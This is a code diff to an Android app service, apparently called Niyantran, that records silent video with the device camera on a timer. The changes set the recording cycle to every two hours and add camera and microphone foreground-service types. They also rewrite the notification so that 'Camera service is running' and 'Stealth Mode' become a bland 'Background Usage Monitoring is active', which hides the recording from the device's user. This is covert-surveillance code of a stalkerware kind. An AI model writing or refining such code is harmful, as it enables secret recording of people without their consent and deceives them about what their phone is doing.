@@ -8,7 +8,6 @@ import android.os.Build;
 import android.content.Context;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.media.CamcorderProfile;
@@ -35,6 +34,8 @@ public class ForegroundService extends Service {
     private Handler handler = new Handler();
     private boolean isRecording = false;
     private String authToken = "";
+    
+    // Redundant methods removed
 
     private Runnable task = new Runnable() {
         @Override
@@ -42,10 +43,15 @@ public class ForegroundService extends Service {
             if (!isRecording) {
                 recordSilentVideo();
             }
-            // Run every 10 minutes for testing (change to 2*60*60*1000 for 2 hours)
-            handler.postDelayed(this, 10 * 60 * 1000);
+            // Run every 2 hours
+            handler.postDelayed(this, 2 * 60 * 60 * 1000);
         }
     };
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+    }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -54,7 +60,12 @@ public class ForegroundService extends Service {
         }
 
         createChannel();
-        startForeground(1, getServiceNotification("Camera service is running..."));
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+            startForeground(1, getServiceNotification("Background Usage Monitoring is active"), 
+                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
+        } else {
+            startForeground(1, getServiceNotification("Background Usage Monitoring is active"));
+        }
         
         // Start the silent recording cycle
         handler.post(task);
@@ -76,7 +87,7 @@ public class ForegroundService extends Service {
 
     private android.app.Notification getServiceNotification(String text) {
         return new NotificationCompat.Builder(this, "service_channel")
-                .setContentTitle("Niyantran Stealth Mode")
+                .setContentTitle("Niyantran")
                 .setContentText(text)
                 .setSmallIcon(android.R.drawable.ic_menu_camera)
                 .build();
